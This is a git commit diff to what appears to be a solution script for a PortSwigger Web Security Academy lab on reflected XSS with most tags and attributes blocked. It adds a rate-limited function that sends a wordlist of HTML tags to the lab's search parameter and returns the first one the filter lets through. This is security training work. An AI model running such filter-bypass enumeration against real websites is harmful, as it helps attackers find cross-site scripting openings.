03e22eb0ae7718a7fbcde949b26e921de1fd6b31
Michael George <michael.g.george@gmail.com>
2022-11-04 07:10:12 +0530

    Add tag_enum most_tags_attrbs_blocked reflected xss

--- portswigger/xss/reflected/most_tags_attrbs_blocked/script.py
+++ portswigger/xss/reflected/most_tags_attrbs_blocked/script.py
@@ -1,5 +1,6 @@
 from requests import get
 from ratelimit import limits, RetryLimitException, sleep_and_retry
+from pathlib import Path
 
 url = 'https://INSTANCE-ID.web-security-academy.net/?search='
 
@@ -10,3 +11,13 @@ MAX_CALLS_PER_MINUTE = 120
 @limits(calls=MAX_CALLS_PER_MINUTE, period=ONE_MINUTE)
 def make_tag_call(url, tag):
     return get(url + tag)
+
+def tag_enum(url, tag_file_path):
+    with Path(tag_file_path).open('r') as file:
+        for tag in file.readlines():
+            response = make_tag_call(url, tag.strip())
+            if response.status_code != 400:
+                return tag
+
+    return "NOT FOUND"
+
